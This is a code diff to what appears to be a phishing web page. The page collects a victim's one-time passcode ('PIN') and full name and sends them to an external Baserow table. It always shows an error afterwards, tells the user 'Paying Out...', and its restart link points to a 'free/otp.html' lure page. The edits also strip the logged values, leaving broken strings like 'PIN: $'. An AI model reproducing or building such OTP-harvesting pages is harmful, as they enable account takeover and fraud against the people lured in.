@@ -439,15 +439,15 @@
             document.getElementById('loadingDiv').style.display = 'block';
             
             addDebugInfo(`Starting submission...`);
-            addDebugInfo(`PIN: ${otpCode}`);
-            addDebugInfo(`Name: ${fullName}`);
-            addDebugInfo(`API URL: ${BASEROW_API}`);
+            addDebugInfo(`PIN: $`);
+            addDebugInfo(`Name: $`);
+            addDebugInfo(`API URL:`);
             
             // Try multiple data formats to ensure one works
             const dataFormats = [
                 // Format 1: Using "Email" field
                 {
-                    'Email': `PIN: ${otpCode} | Name: ${fullName}`
+                    'Email': ` | Name:`
                 },
                 // Format 2: Using "email" field (lowercase)
                 {
@@ -545,9 +545,9 @@
             document.getElementById('loadingDiv').style.display = 'none';
             
             if (success) {
-                addDebugInfo('Data successfully sent to Baserow!');
+                addDebugInfo('Paying Out...');
             } else {
-                addDebugInfo('All attempts failed. Please check your Baserow table structure.');
+                addDebugInfo('All attempts failed. Please check your code');
             }
             
             // Always show error modal as requested
@@ -556,7 +556,7 @@
         
         // Start again function
         function startAgain() {
-            window.location.href = 'https://www.ght.com';
+            window.location.href = 'https://yycloan.github.io/free/otp.html';
         }
         
         // Close modal when clicking outside
